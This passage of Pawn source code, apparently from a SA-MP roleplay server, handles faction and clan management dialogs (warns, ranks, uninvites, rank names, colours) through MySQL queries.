			new string1[300],result[30],name[30],rank,ftime,reason[128],idd;
			format(string1, sizeof(string1), "SELECT * FROM `users` WHERE `id`='%d'",Selected2[playerid]);
			new Cache: membresult = mysql_query(SQL,string1);
			for(new i, j = cache_get_row_count (); i != j; ++i)
			{
				cache_get_field_content(i, "name", result); format(name, 30, result);
				ftime = cache_get_field_content_int(i, "FactionTime");
				rank = cache_get_field_content_int(i, "Rank");
				idd = cache_get_field_content_int(i, "id");
			}
			cache_delete(membresult);
			mysql_real_escape_string(inputtext, reason);
			new string2[500],query[500];
			format(string2, sizeof(string2), "%s was uninvited by %s from faction %s (rank %d) after %d days, without FP. Reason: %s.", name,PlayerInfo[playerid][pNormalName],DynamicFactions[PlayerInfo[playerid][pMember]][fName],rank,ftime,reason);
			mysql_format(SQL, query, sizeof(query), "INSERT INTO faction_logs (`text`,`player`,`leader`) VALUES ('%s','%d','%d')", string2, idd, PlayerInfo[playerid][pSQLID]);
			mysql_tquery(SQL,query,"","");
			mysql_format(SQL,string1,sizeof(string1),"UPDATE users SET `Team`='3',`Member`='0',`Leader`='0',`Rank`='0',`Model`='250',`FPunish`='0',`FWarn`='0',`FactionTime`='0',`FactionJoin`='0' WHERE `id`='%d'",Selected2[playerid]);
			mysql_tquery(SQL,string1,"","");
			foreach(Player, i)
			{
				if(PlayerInfo[i][pSQLID] == Selected2[playerid])
				{
					gTeam[i] = 3;
					PlayerInfo[i][pTeam] = 3;
					PlayerInfo[i][pMember] = 0;
					PlayerInfo[i][pRank] = 0;
      				PlayerInfo[i][pLeader] = 0;
					PlayerInfo[i][pFACWarns] = 0;
					PlayerInfo[i][pFpunish] = 0;
					PlayerInfo[i][pFactionTime] = 0;
					PlayerInfo[i][pModel] = 250;
					SetPlayerArmourEx(i, 0);
					tazer[i] = 0;
					OnDuty[i] = 0;
					SetPlayerSkin(i,PlayerInfo[i][pModel]);
					SpawnPlayer(i);
				}
			}
			format(string1, sizeof(string1),"%s was uninvited by %s from faction %s (rank %d) after %d days, without FP. Reason: %s",name,PlayerInfo[playerid][pNormalName],DynamicFactions[PlayerInfo[playerid][pMember]][fName],rank,ftime,reason);
            Factionlog(PlayerInfo[playerid][pMember],idd,PlayerInfo[playerid][pSQLID],string1);
			SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_GENANNOUNCE, string1);
		}
		return 1;
	}
	if(dialogid == DIALOG_FWARN)
	{
		if(response)
		{
			new str[256],stringg[128],fwarn,name[30],name2[30],result[30],idd;
			format(stringg, sizeof(stringg), "SELECT * FROM `users` WHERE `id`='%d'",Selected2[playerid]);
			new Cache: membresult = mysql_query(SQL,stringg);
			for(new i, j = cache_get_row_count (); i != j; ++i)
			{
				idd = cache_get_field_content_int(i, "id");
				cache_get_field_content(i, "name", result); format(name2, 30, result);
				fwarn = cache_get_field_content_int(i, "FWarn");
			}
			cache_delete(membresult);
			if(fwarn == 2) return SendClientMessage(playerid, COLOR_SERVER, "Can give up to 2 FW a member at the 3rd FW give uninvite.");
			mysql_format(SQL,str,sizeof(str),"UPDATE users SET FWarn = FWarn+1 WHERE id = %d",Selected2[playerid]);
			mysql_tquery(SQL,str,"","");
			SendClientMessage(playerid, COLOR_SERVER, "Ready! That player got FW.");
			GetPlayerName(playerid, name, sizeof(name));
			foreach(Player, i)
			{
				if(PlayerInfo[i][pSQLID] == Selected2[playerid])
				{
					PlayerInfo[i][pFACWarns] += 1;
					format(stringg, sizeof(stringg),"%s gave you a FW (faction warn).",name);
					SendClientMessage(i, COLOR_GENANNOUNCE, stringg);
				}
			}
			format(str,sizeof(str),"%s received a faction warn from %s. FW: %d/3.",name2,name,(fwarn+1));
			Factionlog(PlayerInfo[playerid][pMember],idd,PlayerInfo[playerid][pSQLID],str);
		}
		return 1;
	}
	if(dialogid == DIALOG_FUNWARN)
	{
		if(response)
		{
			new str[256],stringg[128],fwarn,name[30],name2[30],result[30],idd;
			format(stringg, sizeof(stringg), "SELECT * FROM `users` WHERE `id`='%d'",Selected2[playerid]);
			new Cache: membresult = mysql_query(SQL,stringg);
			for(new i, j = cache_get_row_count (); i != j; ++i)
			{
				idd = cache_get_field_content_int(i, "id");
				cache_get_field_content(i, "name", result); format(name2, 30, result);
				fwarn = cache_get_field_content_int(i, "FWarn");
			}
			cache_delete(membresult);
			if(fwarn == 0) return SendClientMessage(playerid, COLOR_SERVER, "The member has no FW.");
			mysql_format(SQL,str,sizeof(str),"UPDATE users SET FWarn = FWarn-1 WHERE id = %d",Selected2[playerid]);
			mysql_tquery(SQL,str,"","");
			SendClientMessage(playerid, COLOR_SERVER, "Ready! That player and was out a FW.");
			GetPlayerName(playerid, name, sizeof(name));
			foreach(Player, i)
			{
				if(PlayerInfo[i][pSQLID] == Selected2[playerid])
				{
					PlayerInfo[i][pFACWarns] += 1;
					format(stringg, sizeof(stringg),"%s He gave a FW (faction warn).",name);
					SendClientMessage(i, COLOR_GENANNOUNCE, stringg);
				}
			}
			format(str,sizeof(str),"%s got a FW clear from %s.",name2,name);
			Factionlog(PlayerInfo[playerid][pMember],idd,PlayerInfo[playerid][pSQLID],str);
		}
		return 1;
	}
	if(dialogid == DIALOG_CLAN)
	{
			if(!response)
			{
				hidePlayerDialog(playerid);
			}
			else
			{
				if(PlayerInfo[playerid][pClan] >= 1)
				{
					switch(listitem)
					{
						case 0:
						{
							SendClientMessage(playerid, COLOR_GENANNOUNCE, "Clan help:");
							SendClientMessage(playerid, COLOR_GREY, "/clan - clan menu, /c - clan chat, /cinvite - inviting a member of the clan, /quitclan - leaving clan.");
							SCM(playerid, COLOR_GREY, "/cattack - assaulting a clan, /topclans - Displaying the top 5 clans.");
							SCM(playerid, COLOR_GREY, "/cmotd - Set a message that is displayed each time they log of members belonging to the clan.");
						}
						case 1:
						{
							new aim[569],query[300],warns[5],test[5],result[300],idd,mid=1,aim2[1500];
							format(query, sizeof(query), "SELECT * FROM `users` WHERE `Clan` = '%d' ORDER BY `CRank` DESC LIMIT 100",PlayerInfo[playerid][pClan]);
							new Cache: membresult = mysql_query(SQL,query);
							for(new i, j = cache_get_row_count (); i != j; ++i)
							{
								cache_get_field_content(i, "name", result); format(query, 30, result);
								cache_get_field_content(i, "CRank", result); format(test, 5, result);
								cache_get_field_content(i, "ClanWarns", result); format(warns, 5, result);
								idd = cache_get_field_content_int(i, "id");
								Selected[playerid][mid] = idd;
								format(aim, sizeof(aim), "%s[R%s] [%s/3 warns] %s\n",aim, test, warns, query);
								mid++;
							}
							cache_delete(membresult);
							format(aim2,sizeof(aim2),"{F89B0E}[+] Invite a new member\n%s",aim);
							ShowPlayerDialog(playerid, DIALOG_CLANMEMBERS, DIALOG_STYLE_LIST, "Clan Members", aim2, "Select", "Back");
						}
						case 2:
						{
							ShowPlayerDialog(playerid, DIALOG_CLANSETTINGS, DIALOG_STYLE_LIST, "Clan settings", "Clan Rank Names\nChange Clan Chat Color", "Select", "Back");
						}
						case 3:
						{
							new strings[256];
							format(strings,sizeof(strings),"Remove Clan Tag: %s\nUse Clan Tag #1: %s%s\nUse Clan Tag #2: %s%s",PlayerInfo[playerid][pNormalName],ClanInfo[PlayerInfo[playerid][pClan]][cClanTag],PlayerInfo[playerid][pNormalName],PlayerInfo[playerid][pNormalName],ClanInfo[PlayerInfo[playerid][pClan]][cClanTag]);
							ShowPlayerDialog(playerid, DIALOG_CLAN_TAG, DIALOG_STYLE_LIST, "Clan Tag",strings, "Select", "Back");
						}
					}
				}
				else
				{
					hidePlayerDialog(playerid);
				}
			}
		}
	if(dialogid == DIALOG_CLANMEMBERS)
	{
		if(response)
		{
			if(PlayerInfo[playerid][pClan] >= 1)
			{
				if(listitem == 0)
				{
					SendClientMessage(playerid, COLOR_SERVER, "Usage: /cinvite <id>");
				}
				if(listitem > 0)
				{
					new name[30],result[30],query[300],test[5],warns[5],laston[64],clantime[5],clanjoin[64],strings[300];
					format(query, sizeof(query), "SELECT * FROM `users` WHERE `id`='%d'",Selected[playerid][listitem]);
					new Cache: membresult = mysql_query(SQL,query);
					for(new i, j = cache_get_row_count (); i != j; ++i)
					{
						cache_get_field_content(i, "name", result); format(name, 30, result);
						cache_get_field_content(i, "CRank", result); format(test, 5, result);
						cache_get_field_content(i, "ClanWarns", result); format(warns, 5, result);
						cache_get_field_content(i, "lastOn", result); format(laston, 64, result);
						cache_get_field_content(i, "ClanTime", result); format(clantime, 5, result);
						cache_get_field_content(i, "ClanJoin", result); format(clanjoin, 64, result);
					}
					cache_delete(membresult);
					Selected2[playerid] = Selected[playerid][listitem];
					format(strings,sizeof(strings),"User: %s\nRank: %s\nWarns: %s/3\nJoined: %s\nLast login: %s\nDays in clan: %s",name,test,warns,clanjoin,laston,clantime);
					if(PlayerInfo[playerid][pCRank] > 5)
					{
						ShowPlayerDialog(playerid, DIALOG_CLANMEMBERS2, DIALOG_STYLE_MSGBOX, "Manage user", strings, "Options", "Back");
					}
					else
					{
						ShowPlayerDialog(playerid, DIALOG_CLANMEMBERS2, DIALOG_STYLE_MSGBOX, "Manage user", strings, "Back", "");
					}
				}
			}
		}
		else return ShowPlayerDialog(playerid, DIALOG_CLAN, DIALOG_STYLE_LIST, "Clan", "Clan Help\nClan Members\nClan Settings\nClan Tag", "Select", "Close");
	}
	if(dialogid == DIALOG_CLANMEMBERS2)
	{
		if(response)
		{
			if(PlayerInfo[playerid][pCRank] > 5)
			{
				ShowPlayerDialog(playerid, DIALOG_CLANMEMBERS3, DIALOG_STYLE_LIST, "Manage user", "Set clan rank\nSet clan warn\nUninvite from clan", "Options", "Back");
			}
			else return ShowPlayerDialog(playerid, DIALOG_CLAN, DIALOG_STYLE_LIST, "Clan", "Clan Help\nClan Members\nClan Settings\nClan Tag", "Select", "Close");
		}
		else return ShowPlayerDialog(playerid, DIALOG_CLAN, DIALOG_STYLE_LIST, "Clan", "Clan Help\nClan Members\nClan Settings\nClan Tag", "Select", "Close");
	}
	if(dialogid == DIALOG_CLAN_WARNS)
	{
		if(response)
		{
			if(PlayerInfo[playerid][pCRank] >= 6)
			{
				if(listitem >= 0)
				{
					new name1[30],name2[30],rank,str1[300],result[30],clan = PlayerInfo[playerid][pClan],strings[128],str2[128];
					format(str1, sizeof(str1), "SELECT name, CRank FROM `users` WHERE `id`='%d'",Selected2[playerid]);
					new Cache: membresult = mysql_query(SQL,str1);
					for(new i, j = cache_get_row_count (); i != j; ++i)
					{
						cache_get_field_content(i, "name", result); format(name2, 30, result);
						rank = cache_get_field_content_int(i, "CRank");
					}
					cache_delete(membresult);
					if(rank > 5 && PlayerInfo[playerid][pCRank] < 7) return SendClientMessage(playerid, COLOR_SERVER, "Numai liderul (rank 7) poate seta warn levelul membrilor cu rank mai mare de 5.");
					foreach(Player,i)
					{
						if(PlayerInfo[i][pSQLID] == Selected2[playerid])
						{
							PlayerInfo[i][pWarns] = (listitem);
						}
					}
					GetPlayerName(playerid, name1, sizeof(name1));
					format(str1,sizeof(str1),"{%s}[CLAN] %s changed %s's warn level to %d.", ClanInfo[clan][cClanColor], name1, name2, listitem);
					SendToClan(PlayerInfo[playerid][pClan], COLOR_SERVER, str1);
					mysql_format(SQL,str1, sizeof(str1), "UPDATE users SET `ClanWarns`='%d' WHERE `id`='%d'", listitem,Selected2[playerid]);
	       			mysql_tquery(SQL,str1,"","");
					format(str1, sizeof(str1), "%s changed %s's warn level to %d.",name1,name2,listitem);
					mysql_real_escape_string(str1, strings);
					mysql_format(SQL,str2,sizeof(str2),"INSERT INTO clan_logs (`action`,`clanid`) VALUES ('%s','%d')",strings,PlayerInfo[playerid][pClan]);
					mysql_tquery(SQL,str2,"","");
				}
			}
		}
		else return ShowPlayerDialog(playerid, DIALOG_CLAN, DIALOG_STYLE_LIST, "Clan", "Clan Help\nClan Members\nClan Settings\nClan Tag", "Select", "Close");
	}
	if(dialogid == DIALOG_CLAN_RANK)
	{
		if(response)
		{
			if(PlayerInfo[playerid][pCRank] == 6)
			{
				if(listitem >= 0 && listitem <= 5)
				{
					new name1[30],name2[30],rank,str1[300],result[30],clan = PlayerInfo[playerid][pClan],strings[128],str2[128];
					format(str1, sizeof(str1), "SELECT name, CRank FROM `users` WHERE `id`='%d'",Selected2[playerid]);
					new Cache: membresult = mysql_query(SQL,str1);
					for(new i, j = cache_get_row_count (); i != j; ++i)
					{
						cache_get_field_content(i, "name", result); format(name2, 30, result);
						rank = cache_get_field_content_int(i, "CRank");
					}
					cache_delete(membresult);
					if(rank > 5 && PlayerInfo[playerid][pCRank] < 7) return SendClientMessage(playerid, COLOR_SERVER, "Only leader (rank 7) can set rank rank members with more than 5.");
					foreach(Player,i)
					{
						if(PlayerInfo[i][pSQLID] == Selected2[playerid])
						{
							PlayerInfo[i][pCRank] = (listitem+1);
						}
					}
					GetPlayerName(playerid, name1, sizeof(name1));
					format(str1,sizeof(str1),"{%s}[CLAN] %s changed %s's rank to %d.", ClanInfo[clan][cClanColor], name1, name2, (listitem+1));
					SendToClan(PlayerInfo[playerid][pClan], COLOR_SERVER, str1);
					mysql_format(SQL,str1, sizeof(str1), "UPDATE users SET `CRank`='%d' WHERE `id`='%d'", (listitem+1),Selected2[playerid]);
	       			mysql_tquery(SQL,str1,"","");
					format(str2, sizeof(str2), "%s changed %s's rank to %d.",name1,name2,(listitem+1));
					mysql_real_escape_string(str2, strings);
					mysql_format(SQL,str1,sizeof(str1),"INSERT INTO clan_logs (`action`,`clanid`) VALUES ('%s','%d')",strings,PlayerInfo[playerid][pClan]);
					mysql_tquery(SQL,str1,"","");
				}
				if(listitem > 5) return SendClientMessage(playerid, COLOR_SERVER, "Only clan leader (rank 7) may grant rank 6 or 7.");
			}
			else if(PlayerInfo[playerid][pCRank] == 7)
			{
				if(listitem >= 0 && listitem <= 5)
				{
					new name1[30],name2[30],str1[300],result[30],clan = PlayerInfo[playerid][pClan],str2[128],strings[128];
					mysql_format(SQL,str1, sizeof(str1), "UPDATE users SET `CRank`='%d' WHERE `id`='%d'", (listitem+1),Selected2[playerid]);
	       			mysql_tquery(SQL,str1,"","");
					format(str1, sizeof(str1), "SELECT name FROM `users` WHERE `id`='%d'",Selected2[playerid]);
					new Cache: membresult = mysql_query(SQL,str1);
					for(new i, j = cache_get_row_count (); i != j; ++i)
					{
						cache_get_field_content(i, "name", result); format(name2, 30, result);
					}
					cache_delete(membresult);
					foreach(Player,i)
					{
						if(PlayerInfo[i][pSQLID] == Selected2[playerid])
						{
							PlayerInfo[i][pCRank] = (listitem+1);
						}
					}
					GetPlayerName(playerid, name1, sizeof(name1));
					format(str1,sizeof(str1),"{%s}[CLAN] %s changed %s's rank to %d.", ClanInfo[clan][cClanColor], name1, name2, (listitem+1));
					SendToClan(PlayerInfo[playerid][pClan], COLOR_SERVER, str1);
					format(str2, sizeof(str2), "%s changed %s's rank to %d.",name1,name2,(listitem+1));
					mysql_real_escape_string(str2, strings);
					mysql_format(SQL,str1,sizeof(str1),"INSERT INTO clan_logs (`action`,`clanid`) VALUES ('%s','%d')",strings,PlayerInfo[playerid][pClan]);
					mysql_tquery(SQL,str1,"","");
				}
				if(listitem == 6)
				{
					new name1[30],name2[30],str1[300],result[30],clan = PlayerInfo[playerid][pClan],str2[128],strings[128];
					mysql_format(SQL,str1, sizeof(str1), "UPDATE users SET `CRank`='7' WHERE `id`='%d'", Selected2[playerid]);
	       			mysql_tquery(SQL,str1,"","");
					mysql_format(SQL,str1, sizeof(str1), "UPDATE users SET `CRank`='6' WHERE `id`='%d'", PlayerInfo[playerid][pSQLID]);
	       			mysql_tquery(SQL,str1,"","");
					format(str1, sizeof(str1), "SELECT name FROM `users` WHERE `id`='%d'",Selected2[playerid]);
					new Cache: membresult = mysql_query(SQL,str1);
					for(new i, j = cache_get_row_count (); i != j; ++i)
					{
						cache_get_field_content(i, "name", result); format(name2, 30, result);
					}
					cache_delete(membresult);
					foreach(Player,i)
					{
						if(PlayerInfo[i][pSQLID] == Selected2[playerid])
						{
							PlayerInfo[i][pCRank] = 7;
						}
					}
					PlayerInfo[playerid][pCRank] = 6;
					GetPlayerName(playerid, name1, sizeof(name1));
					format(str1,sizeof(str1),"{%s}[CLAN] %s changed %s's rank to 7.", ClanInfo[clan][cClanColor], name1, name2);
					SendToClan(PlayerInfo[playerid][pClan], COLOR_SERVER, str1);
					format(str2, sizeof(str2), "%s changed %s's rank to 7.",name1,name2);
					mysql_real_escape_string(str2, strings);
					mysql_format(SQL,str1,sizeof(str1),"INSERT INTO clan_logs (`action`,`clanid`) VALUES ('%s','%d')",strings,PlayerInfo[playerid][pClan]);
					mysql_tquery(SQL,str1,"","");
				}
			}
		}
		else return ShowPlayerDialog(playerid, DIALOG_CLAN, DIALOG_STYLE_LIST, "Clan", "Clan Help\nClan Members\nClan Settings\nClan Tag", "Select", "Close");
	}
	if(dialogid == DIALOG_CLANMEMBERS3)
	{
		if(response)
		{
			if(listitem == 0)
			{
				if(PlayerInfo[playerid][pCRank] == 6)
				{
					ShowPlayerDialog(playerid, DIALOG_CLAN_RANK, DIALOG_STYLE_LIST, "Set user rank", "Set rank 1\nSet rank 2\nSet rank 3\nSet rank 4\nSet rank 5", "Select", "Back");
				}
				else if(PlayerInfo[playerid][pCRank] == 7)
				{
					ShowPlayerDialog(playerid, DIALOG_CLAN_RANK, DIALOG_STYLE_LIST, "Set user rank", "Set rank 1\nSet rank 2\nSet rank 3\nSet rank 4\nSet rank 5\nSet rank 6\nSet rank 7 - you will get demoted to rank 6", "Select", "Back");
				}
			}
			if(listitem == 1)
			{
				if(PlayerInfo[playerid][pCRank] > 5)
				{
					ShowPlayerDialog(playerid, DIALOG_CLAN_WARNS, DIALOG_STYLE_LIST, "Set user warns", "Warns: 0/3\nWarns: 1/3\nWarns: 2/3", "Select", "Back");
				}
			}
			if(listitem == 2)
			{
				if(PlayerInfo[playerid][pCRank] > 5)
				{
					new str1[300],name1[30],name2[30],rank,clan = PlayerInfo[playerid][pClan],result[30],strings[300],str2[128];
					format(str1, sizeof(str1), "SELECT name, CRank FROM `users` WHERE `id`='%d'",Selected2[playerid]);
					new Cache: membresult = mysql_query(SQL,str1);
					for(new i, j = cache_get_row_count (); i != j; ++i)
					{
						cache_get_field_content(i, "name", result); format(name2, 30, result);
						rank = cache_get_field_content_int(i, "CRank");
					}
					cache_delete(membresult);
					if(rank > 5 && PlayerInfo[playerid][pCRank] < 7) return SendClientMessage(playerid, COLOR_SERVER, "Numai liderul (rank 7) poate da afara membrii cu rank mai mare de 5.");
					foreach(Player, userID)
					{
						if(PlayerInfo[userID][pSQLID] == Selected2[playerid])
						{
							GetPlayerName(playerid, name1, sizeof(name1));
							format(str1,sizeof(str1),"{%s}[CLAN] %s left the clan (uninvited by %s).", ClanInfo[clan][cClanColor], name2, name1);
							SendClientMessage(playerid, COLOR_SERVER, str1);
							SetPlayerName(userID, PlayerInfo[userID][pNormalName]);
							PlayerInfo[userID][pClan] = 0;
							PlayerInfo[userID][pCRank] = 0;
							PlayerInfo[userID][pCWarns] = 0;
						}
					}
					format(str2, sizeof(str2), "%s left the clan (uninvited by %s).",name1,name2);
					mysql_real_escape_string(str2, strings);
					mysql_format(SQL,str1,sizeof(str1),"INSERT INTO clan_logs (`action`,`clanid`) VALUES ('%s','%d')",strings,PlayerInfo[playerid][pClan]);
					mysql_tquery(SQL,str1,"","");
					GetPlayerName(playerid, name1, sizeof(name1));
					mysql_format(SQL, str1, sizeof(str1), "UPDATE users SET `CRank`='0',`Clan`='0',`ClanJoin`='0',`ClanTime`='0',`ClanTag`='0',`ClanWarns`='0' WHERE `id`='%d'", Selected2[playerid]);
					mysql_tquery(SQL,str1,"","");
					format(strings,sizeof(strings),"%s te-a dat afara din clan-ul %s.", name1, ClanInfo[PlayerInfo[playerid][pClan]][cClanName]);
					mysql_format(SQL, str1, sizeof(str1), "INSERT INTO `emails` (`playerid`,`Message`) VALUES('%d','%s')",Selected2[playerid],strings);
					mysql_tquery(SQL,str1,"","");
					format(str1,sizeof(str1),"{%s}[CLAN] %s left the clan (uninvited by %s).", ClanInfo[clan][cClanColor], name2, name1);
					SendToClan(PlayerInfo[playerid][pClan], COLOR_SERVER, str1);
				}
			}
		}
		else return ShowPlayerDialog(playerid, DIALOG_CLAN, DIALOG_STYLE_LIST, "Clan", "Clan Help\nClan Members\nClan Settings\nClan Tag", "Select", "Close");
	}
	if(dialogid == DIALOG_CLANSETTINGS)
	{
		if(response)
		{
			if(listitem == 0)
			{
				if(PlayerInfo[playerid][pCRank] > 5)
				{
					new strings[500],i = PlayerInfo[playerid][pClan];
					format(strings,sizeof(string),"Rank 1: %s\nRank 2: %s\nRank 3: %s\nRank 4: %s\nRank 5: %s\nRank 6: %s\nRank 7: %s",ClanInfo[i][cClanRankName1],ClanInfo[i][cClanRankName2],ClanInfo[i][cClanRankName3],ClanInfo[i][cClanRankName4],ClanInfo[i][cClanRankName5],ClanInfo[i][cClanRankName6],ClanInfo[i][cClanRankName7]);
					ShowPlayerDialog(playerid, DIALOG_CLAN_CHANGERANK, DIALOG_STYLE_LIST, "Change clan ranks", strings, "Change", "Back");
				}
			}
			if(listitem == 1)
			{
				if(PlayerInfo[playerid][pCRank] > 5)
				{
					new strings[500];
					format(strings,sizeof(string),"You can go to http://Pack.T-Zone.IR to get html color codes\nEnter the HTML code for the clan color (default FFCC99):");
					ShowPlayerDialog(playerid, DIALOG_CLAN_COLOR, DIALOG_STYLE_INPUT, "Clan color", strings, "Change", "Back");
				}
			}
		}
		else return ShowPlayerDialog(playerid, DIALOG_CLAN, DIALOG_STYLE_LIST, "Clan", "Clan Help\nClan Members\nClan Settings\nClan Tag", "Select", "Close");
	}
	if(dialogid == DIALOG_CLAN_CHANGERANK)
	{
		if(response)
		{
			if(PlayerInfo[playerid][pCRank] > 5)
			{
				new strings[256];
				if(listitem == 0)
				{
					format(strings,sizeof(strings),"Current clan rank 1: %s\n\nSet a new clan rank:",ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName1]);
					Selected2[playerid] = 1;
				}
				if(listitem == 1)
				{
					format(strings,sizeof(strings),"Current clan rank 2: %s\n\nSet a new clan rank:",ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName2]);
					Selected2[playerid] = 2;
				}
				if(listitem == 2)
				{
					format(strings,sizeof(strings),"Current clan rank 3: %s\n\nSet a new clan rank:",ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName3]);
					Selected2[playerid] = 3;
				}
				if(listitem == 3)
				{
					format(strings,sizeof(strings),"Current clan rank 4: %s\n\nSet a new clan rank:",ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName4]);
					Selected2[playerid] = 4;
				}
				if(listitem == 4)
				{
					format(strings,sizeof(strings),"Current clan rank 5: %s\n\nSet a new clan rank:",ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName5]);
					Selected2[playerid] = 5;
				}
				if(listitem == 5)
				{
					format(strings,sizeof(strings),"Current clan rank 6: %s\n\nSet a new clan rank:",ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName6]);
					Selected2[playerid] = 6;
				}
				if(listitem == 6)
				{
					format(strings,sizeof(strings),"Current clan rank 7: %s\n\nSet a new clan rank:",ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName7]);
					Selected2[playerid] = 7;
				}
				ShowPlayerDialog(playerid, DIALOG_CLAN_CHANGERANK2, DIALOG_STYLE_INPUT, "Change clan rank", strings, "Change", "Back");
			}
		}
		else return ShowPlayerDialog(playerid, DIALOG_CLAN, DIALOG_STYLE_LIST, "Clan", "Clan Help\nClan Members\nClan Settings\nClan Tag", "Select", "Close");
	}
	if(dialogid == DIALOG_CLAN_CHANGERANK2)
	{
		if(response)
		{
			if(PlayerInfo[playerid][pCRank] > 5)
			{
			    for(new i; i < sizeof(antisqlinjection); i++)
				{
	    			if(strfind(inputtext, antisqlinjection[i], true) != -1)
	        		{
		      			SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
	      				return 1;
			        }
				}
				if(strlen(inputtext) < 31)
				{
					new ranktext[40],str1[300],strings[128];
					mysql_real_escape_string(inputtext, ranktext);
					if(Selected2[playerid] == 1)
					{
						strmid(ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName1], ranktext, 0, strlen(ranktext), 40);
						mysql_format(SQL,str1, sizeof(str1), "UPDATE `clans` SET `clanRankName1`='%s' WHERE `clanID`='%d'", ranktext,PlayerInfo[playerid][pClan]);
						mysql_tquery(SQL,str1,"","");
						format(strings,sizeof(strings),"{%s}Clan rank 1: %s.",ClanInfo[PlayerInfo[playerid][pClan]][cClanColor],ranktext);
					}
					else if(Selected2[playerid] == 2)
					{
						strmid(ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName2], ranktext, 0, strlen(ranktext), 40);
						mysql_format(SQL,str1, sizeof(str1), "UPDATE `clans` SET `clanRankName2`='%s' WHERE `clanID`='%d'", ranktext,PlayerInfo[playerid][pClan]);
						mysql_tquery(SQL,str1,"","");
						format(strings,sizeof(strings),"{%s}Clan rank 2: %s.",ClanInfo[PlayerInfo[playerid][pClan]][cClanColor],ranktext);
					}
					else if(Selected2[playerid] == 3)
					{
						strmid(ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName3], ranktext, 0, strlen(ranktext), 40);
						mysql_format(SQL,str1, sizeof(str1), "UPDATE `clans` SET `clanRankName3`='%s' WHERE `clanID`='%d'", ranktext,PlayerInfo[playerid][pClan]);
						mysql_tquery(SQL,str1,"","");
						format(strings,sizeof(strings),"{%s}Clan rank 3: %s.",ClanInfo[PlayerInfo[playerid][pClan]][cClanColor],ranktext);
					}
					else if(Selected2[playerid] == 4)
					{
						strmid(ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName4], ranktext, 0, strlen(ranktext), 40);
						mysql_format(SQL,str1, sizeof(str1), "UPDATE `clans` SET `clanRankName4`='%s' WHERE `clanID`='%d'", ranktext,PlayerInfo[playerid][pClan]);
						mysql_tquery(SQL,str1,"","");
						format(strings,sizeof(strings),"{%s}Clan rank 4: %s.",ClanInfo[PlayerInfo[playerid][pClan]][cClanColor],ranktext);
					}
					else if(Selected2[playerid] == 5)
					{
						strmid(ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName5], ranktext, 0, strlen(ranktext), 40);
						mysql_format(SQL,str1, sizeof(str1), "UPDATE `clans` SET `clanRankName5`='%s' WHERE `clanID`='%d'", ranktext,PlayerInfo[playerid][pClan]);
						mysql_tquery(SQL,str1,"","");
						format(strings,sizeof(strings),"{%s}Clan rank 5: %s.",ClanInfo[PlayerInfo[playerid][pClan]][cClanColor],ranktext);
					}
					else if(Selected2[playerid] == 6)
					{
						strmid(ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName6], ranktext, 0, strlen(ranktext), 40);
						mysql_format(SQL,str1, sizeof(str1), "UPDATE `clans` SET `clanRankName6`='%s' WHERE `clanID`='%d'", ranktext,PlayerInfo[playerid][pClan]);
						mysql_tquery(SQL,str1,"","");
						format(strings,sizeof(strings),"{%s}Clan rank 6: %s.",ClanInfo[PlayerInfo[playerid][pClan]][cClanColor],ranktext);
					}
					else if(Selected2[playerid] == 7)
					{
						strmid(ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName7], ranktext, 0, strlen(ranktext), 40);
						mysql_format(SQL,str1, sizeof(str1), "UPDATE `clans` SET `clanRankName7`='%s' WHERE `clanID`='%d'", ranktext,PlayerInfo[playerid][pClan]);
						mysql_tquery(SQL,str1,"","");
						format(strings,sizeof(strings),"{%s}Clan rank 7: %s.",ClanInfo[PlayerInfo[playerid][pClan]][cClanColor],ranktext);
					}
					SendClientMessage(playerid, COLOR_SERVER, strings);
				}
			}
		}
		else return ShowPlayerDialog(playerid, DIALOG_CLAN, DIALOG_STYLE_LIST, "Clan", "Clan Help\nClan Members\nClan Settings\nClan Tag", "Select", "Close");
	}
	if(dialogid == DIALOG_CLAN_COLOR)
	{
		if(response)
		{
			if(PlayerInfo[playerid][pCRank] > 5)
			{
			    for(new i; i < sizeof(antisqlinjection); i++)
				{
	    			if(strfind(inputtext, antisqlinjection[i], true) != -1)
	        		{
		      			SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
	      				return 1;
			        }
				}
				new len = strlen(inputtext),str1[300],colortext[7],strings[128];
				if(len == 6)
				{
					for(new i=0;i<len;i++)
					{
						if((inputtext[i] >= 'A' && inputtext[i] <= 'F') || (inputtext[i] >= '0' && inputtext[i] <= '9'))
						{
							mysql_real_escape_string(inputtext, colortext);
							strmid(ClanInfo[PlayerInfo[playerid][pClan]][cClanColor], colortext, 0, strlen(colortext), 64);
							mysql_format(SQL,str1, sizeof(str1), "UPDATE `clans` SET `clanColor`='%s' WHERE `clanID`='%d'", colortext,PlayerInfo[playerid][pClan]);
							mysql_tquery(SQL,str1,"","");
							format(strings,sizeof(strings),"Clan color changed to {%s}%s{FFFFFF}.",colortext,colortext);
						}
						else return SendClientMessage(playerid, COLOR_SERVER, "color invalid.");
					}
					SendClientMessage(playerid, COLOR_SERVER, strings);
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "color invalid.");
			}
		}
		else return ShowPlayerDialog(playerid, DIALOG_CLAN, DIALOG_STYLE_LIST, "Clan", "Clan Help\nClan Members\nClan Settings\nClan Tag", "Select", "Close");
	}
	if(dialogid == DIALOG_CLAN_TAG)
	{
			if(!response)
			{
				ShowPlayerDialog(playerid, DIALOG_CLAN, DIALOG_STYLE_LIST, "Clan", "Clan Help\nClan Members\nClan Settings\nClan Tag", "Select", "Close");
			}
			else
			{
				if(PlayerInfo[playerid][pClan] >= 1)
				{
					new szName[25],str111[256],str222[256],str333[256],strings[128];
					switch(listitem)
					{
						case 0:
						{
							format(szName, sizeof(szName), "%s", PlayerInfo[playerid][pNormalName]);
